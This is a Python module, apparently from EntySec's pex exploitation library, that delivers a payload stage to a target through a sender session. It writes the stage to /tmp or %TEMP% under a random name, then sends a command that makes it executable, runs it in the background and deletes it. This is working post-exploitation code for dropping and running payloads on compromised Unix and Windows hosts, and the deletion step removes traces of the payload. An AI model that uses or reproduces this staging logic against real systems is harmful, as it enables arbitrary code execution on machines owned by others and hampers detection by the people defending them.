#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from .push import Push
from .tools import PostTools

from pex.type import Type
from pex.string import String


class Post:
    push = Push()

    post_tools = PostTools()
    type_tools = Type()
    string_tools = String()

    post_methods = push.push_methods

    def post(self, stage, sender, platform, architecture, args=[], arguments='',
             method=None, location=None, concat=None, background=None, linemax=100):
        platforms = self.type_tools.platforms
        architectures = self.type_tools.architectures

        if method in self.post_methods or not method:
            if not method:
                for post_method in self.post_methods:
                    if platform in self.post_methods[post_method][0]:
                        method = post_method

                if not method:
                    raise RuntimeError(f"No supported post methods found for {platform} platform!")
            else:
                if platform not in self.post_methods[method][0]:
                    raise RuntimeError(f"Post method {method} is unsupported for {platform} platform!")

            filename = self.string_tools.random_string(8)

            if platform in platforms['unix']:
                if not location:
                    location = '/tmp'
                if not concat:
                    concat = ';'
                if not background:
                    background = '&'

                path = location + '/' + filename

                if architecture in architectures['cpu']:
                    command = f"sh -c 'chmod 777 {path} {concat} {path} {arguments} {concat} rm {path}' {background}"

                elif architecture in architectures['generic']:
                    command = f"{architecture} {path} {arguments} {concat} rm {path}"

                else:
                    raise RuntimeError(f"Architecture {architecture} in unsupported!")

            elif platform in platforms['windows']:
                if not location:
                    location = '%TEMP%'
                if not concat:
                    concat = '&'
                if not background:
                    background = ''

                path = location + '\\' + filename

                if architecture in architectures['cpu']:
                    command = f"{background} {path} {arguments} {concat} del {path}"

                elif architecture in architectures['generic']:
                    command = f"{background} {architecture} {path} {arguments} {concat} del {path}"

                else:
                    raise RuntimeError(f"Architecture {architecture} is unsupported!")
            else:
                raise RuntimeError(f"Platform {platform} in unsupported!")

            self.post_methods[method][1].push(
                sender=sender,
                data=stage if isinstance(stage, bytes) else stage.encode(),
                location=path,
                args=args,
                linemax=linemax
            )

            self.post_tools.post_command(sender, command, args)
        else:
            raise RuntimeError(f"Post method {method} is unsupported!")
